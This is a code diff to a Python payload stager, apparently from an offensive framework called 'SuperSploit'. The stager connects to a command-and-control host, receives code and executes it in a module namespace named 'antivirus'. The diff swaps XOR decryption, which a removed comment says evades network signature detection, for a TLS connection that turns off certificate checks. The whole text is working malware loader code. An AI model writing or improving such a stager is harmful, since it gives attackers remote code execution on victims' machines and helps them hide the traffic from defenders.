@@ -1,4 +1,5 @@
 import types
+import ssl
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -6,28 +7,36 @@ from socket import socket, AF_INET, SOCK_STREAM
 # SuperSploit will dynamically overwrite these values during payload generation.
 C2_HOST = "127.0.0.1"
 C2_PORT = 5000
-XOR_KEY = b"super_secret_key"
 
 class Start:
     
     def __init__(self):
-        self.s = socket(AF_INET, SOCK_STREAM)
-        
         # Only attempt to receive and execute if the connection succeeds
         if self.connect(C2_HOST, C2_PORT):
-            encrypted_payload = self.recv_all()
-            if encrypted_payload:
-                decrypted_payload = self.xor(encrypted_payload, XOR_KEY)
-                self.exc(decrypted_payload)
+            payload = self.recv_all()
+            if payload:
+                self.exc(payload)
                 
         # Clean up the file descriptor silently
-        self.s.close()
+        try:
+            self.s.close()
+        except AttributeError:
+            pass
     
     def connect(self, host, port):
         try:
+            raw_socket = socket(AF_INET, SOCK_STREAM)
+            
+            # Create an SSL context that ignores self-signed certificate validation
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            # Wrap the socket to establish the TLS handshake
+            self.s = context.wrap_socket(raw_socket, server_hostname=host)
             self.s.connect((host, port))
             return True
-        except ConnectionError:
+        except Exception:
             return False
         
     def recv_all(self):
@@ -53,11 +62,6 @@ class Start:
                 return None
             data.extend(packet)
         return bytes(data)
-
-    def xor(self, data, key):
-        # Fast, lightweight XOR decryption loop. 
-        # Reconstructs the original payload bypassing network signature detection.
-        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
     
     def exc(self, payload):
         name_space = "antivirus"
